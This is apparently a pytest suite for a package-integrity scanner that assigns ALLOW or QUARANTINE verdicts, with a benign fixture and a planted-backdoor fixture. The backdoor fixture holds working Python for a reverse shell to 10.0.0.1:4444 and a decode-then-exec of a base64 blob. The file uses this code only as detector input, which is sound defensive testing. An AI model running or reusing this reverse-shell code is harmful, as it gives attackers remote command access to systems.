# CUI // SP-CTI
"""Tests for the SIPA assessment engine (sipa-engine-01).

Covers ``tools/integrity/engine.py``'s ``assess()`` orchestration:

  * **Mode resolution** — ``auto`` -> ``provenance_blind`` with no provenance
    handle, ``provenance_aware`` when a ``project_id`` / ``session_id`` is given;
    explicit modes honored; an invalid mode raises.
  * **End-to-end benign fixture => ALLOW** — a disclosed, low-risk package scores
    under the review threshold, with the assessment persisted + transitioned to
    ``status='assessed'`` and an engine verdict row written.
  * **End-to-end planted-backdoor fixture => QUARANTINE** — an undisclosed
    decode-then-exec + reverse-shell package is force-quarantined, with the
    persisted findings / capabilities / verdict rows asserted.

The pipeline runs for real (ingest -> reverify -> scan_all -> capability extract
-> Mode B reconcile -> score) against an in-memory SQLite connection. The two
subprocess-backed scanner seams are stubbed for determinism + speed:
``scanners._invoke_scanner`` (SAST/secrets/deps) returns an empty JSON document,
and ``scanners._detect_signatures`` returns ``None`` so the malicious-signature
scan exercises its deterministic regex fallback (no Semgrep binary required).
"""
import json
import sqlite3

import pytest

from tools.integrity import engine, scanners
from tools.integrity.db import init_db as init_db_mod


# --------------------------------------------------------------------------- #
# Fixtures — benign + planted-backdoor source trees
# --------------------------------------------------------------------------- #
_BENIGN_README = """\
# Tinylog

A tiny utility that reads and writes log files on disk. It saves entries to a
file and reads them back. Nothing else — no network, no subprocesses.
"""

_BENIGN_PY = '''\
"""Tinylog — read and write log entries to a file on disk."""
from pathlib import Path


def write_entry(path, text):
    Path(path).write_text(text, encoding="utf-8")


def read_entries(path):
    return Path(path).read_text(encoding="utf-8")
'''

# Undisclosed (NO README) decode-then-exec + reverse-shell backdoor. Exercises
# network_egress + process_exec + dynamic_code + obfuscation, none disclosed, so
# Mode B reconciliation forces QUARANTINE on the undisclosed process_exec, and the
# regex signature fallback independently trips reverse_shell + decode_then_exec.
_BACKDOOR_PY = '''\
import base64
import os
import socket
import subprocess

_BLOB = "cHJpbnQoJ3B3bmVkJyk="  # base64 payload


def _callback():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("10.0.0.1", 4444))
    os.dup2(s.fileno(), 0)
    os.dup2(s.fileno(), 1)
    subprocess.call(["/bin/sh", "-i"])


def _run():
    exec(base64.b64decode(_BLOB))
'''


def _write_tree(base, files):
    base.mkdir(parents=True, exist_ok=True)
    for name, content in files.items():
        (base / name).write_text(content, encoding="utf-8")
    return base


@pytest.fixture
def benign_source(tmp_path):
    return _write_tree(
        tmp_path / "benign_src",
        {"README.md": _BENIGN_README, "tinylog.py": _BENIGN_PY},
    )


@pytest.fixture
def backdoor_source(tmp_path):
    return _write_tree(tmp_path / "backdoor_src", {"helper.py": _BACKDOOR_PY})


@pytest.fixture
def conn():
    c = sqlite3.connect(":memory:")
    c.row_factory = sqlite3.Row
    init_db_mod.init_db(c)
    yield c
    c.close()


@pytest.fixture
def deterministic_scanners(monkeypatch, tmp_path):
    """Make scan_all deterministic + fast and isolate the quarantine dir.

    The external scanner subprocess seam returns an empty JSON document (no real
    bandit/pip-audit), and the Semgrep probe returns ``None`` so the signature
    scan uses its regex fallback — the path that catches the planted backdoor
    offline.
    """
    monkeypatch.setenv("ICDEV_INTEGRITY_QUARANTINE_DIR", str(tmp_path / "quarantine"))
    monkeypatch.setenv("ICDEV_STORAGE_BACKEND", "sqlite")
    monkeypatch.setattr(scanners, "_invoke_scanner", lambda cmd, timeout: (0, "{}", ""))
    monkeypatch.setattr(scanners, "_detect_signatures", lambda staged: None)


# --------------------------------------------------------------------------- #
# Mode resolution
# --------------------------------------------------------------------------- #
def test_resolve_mode_auto_blind_without_provenance():
    assert engine.resolve_mode("auto", None, None) == engine.PROVENANCE_BLIND


def test_resolve_mode_auto_aware_with_project():
    assert engine.resolve_mode("auto", "proj-1", None) == engine.PROVENANCE_AWARE
    assert engine.resolve_mode("auto", None, "sess-1") == engine.PROVENANCE_AWARE


def test_resolve_mode_explicit_overrides_auto():
    # Explicit blind wins even when a provenance handle is present.
    assert engine.resolve_mode("provenance_blind", "proj-1", None) == engine.PROVENANCE_BLIND
    assert engine.resolve_mode("provenance_aware", None, None) == engine.PROVENANCE_AWARE


def test_resolve_mode_invalid_raises():
    with pytest.raises(ValueError):
        engine.resolve_mode("nonsense", None, None)


# --------------------------------------------------------------------------- #
# is_enabled feature flag
# --------------------------------------------------------------------------- #
def test_is_enabled_reflects_flag(monkeypatch):
    monkeypatch.delenv("ICDEV_INTEGRITY_ENABLED", raising=False)
    assert engine.is_enabled() is False
    monkeypatch.setenv("ICDEV_INTEGRITY_ENABLED", "true")
    assert engine.is_enabled() is True
    monkeypatch.setenv("ICDEV_INTEGRITY_ENABLED", "0")
    assert engine.is_enabled() is False


# --------------------------------------------------------------------------- #
# End-to-end — benign fixture => ALLOW
# --------------------------------------------------------------------------- #
def test_assess_benign_is_allow(benign_source, conn, deterministic_scanners):
    result = engine.assess(str(benign_source), conn=conn)

    # auto + no provenance -> Mode B (provenance_blind).
    assert result["mode"] == engine.PROVENANCE_BLIND
    assert result["verdict"] == "allow"
    assert result["risk_score"] < 40
    assert result["status"] == "assessed"
    assert result["capabilities_count"] >= 1  # the disclosed filesystem capability

    aid = result["assessment_id"]

    # Assessment row persisted + transitioned to 'assessed', verdict stamped.
    arow = conn.execute(
        "SELECT mode, status, verdict, risk_score FROM integrity_assessments WHERE id = ?",
        (aid,),
    ).fetchone()
    assert arow["status"] == "assessed"
    assert arow["mode"] == "provenance_blind"
    assert arow["verdict"] == "allow"

    # Append-only engine verdict row written.
    vrow = conn.execute(
        "SELECT verdict, decided_by FROM integrity_verdicts WHERE assessment_id = ?", (aid,)
    ).fetchone()
    assert vrow["verdict"] == "allow"
    assert vrow["decided_by"] == "engine"

    # Disclosed filesystem capability => no undisclosed_capability finding.
    undisclosed = conn.execute(
        "SELECT COUNT(*) FROM integrity_findings "
        "WHERE assessment_id = ? AND finding_type = 'undisclosed_capability'",
        (aid,),
    ).fetchone()[0]
    assert undisclosed == 0


# --------------------------------------------------------------------------- #
# End-to-end — planted backdoor => QUARANTINE
# --------------------------------------------------------------------------- #
def test_assess_planted_backdoor_is_quarantine(backdoor_source, conn, deterministic_scanners):
    result = engine.assess(str(backdoor_source), conn=conn)

    assert result["mode"] == engine.PROVENANCE_BLIND
    assert result["verdict"] == "quarantine"
    assert result["status"] == "assessed"
    assert result["findings_count"] >= 1
    assert result["capabilities_count"] >= 1

    aid = result["assessment_id"]

    # Capabilities persisted include the dangerous trio.
    cap_types = {
        r[0]
        for r in conn.execute(
            "SELECT DISTINCT capability_type FROM integrity_capabilities WHERE assessment_id = ?",
            (aid,),
        ).fetchall()
    }
    assert {"network_egress", "process_exec", "dynamic_code"} <= cap_types

    # Mode B reconciliation wrote undisclosed-capability findings (nothing disclosed).
    undisclosed_caps = {
        json.loads(r[0]).get("capability_type")
        for r in conn.execute(
            "SELECT detail FROM integrity_findings "
            "WHERE assessment_id = ? AND finding_type = 'undisclosed_capability'",
            (aid,),
        ).fetchall()
    }
    assert "process_exec" in undisclosed_caps  # the forced-QUARANTINE driver

    # The signature regex fallback wrote a critical known_bad_signature finding.
    sig = conn.execute(
        "SELECT COUNT(*) FROM integrity_findings "
        "WHERE assessment_id = ? AND finding_type = 'known_bad_signature' AND severity = 'critical'",
        (aid,),
    ).fetchone()[0]
    assert sig >= 1

    # Engine verdict row + rationale flag the forced quarantine.
    vrow = conn.execute(
        "SELECT verdict, decided_by, rationale FROM integrity_verdicts WHERE assessment_id = ?",
        (aid,),
    ).fetchone()
    assert vrow["verdict"] == "quarantine"
    assert vrow["decided_by"] == "engine"
    assert json.loads(vrow["rationale"])["forced_quarantine"] is True


def test_assess_appends_not_updates_verdicts(backdoor_source, conn, deterministic_scanners):
    # Re-assessing the SAME staged source writes a second assessment + verdict row
    # (append-only; the engine never rewrites a prior disposition).
    r1 = engine.assess(str(backdoor_source), conn=conn)
    r2 = engine.assess(str(backdoor_source), conn=conn)
    assert r1["assessment_id"] != r2["assessment_id"]
    n = conn.execute("SELECT COUNT(*) FROM integrity_verdicts").fetchone()[0]
    assert n == 2
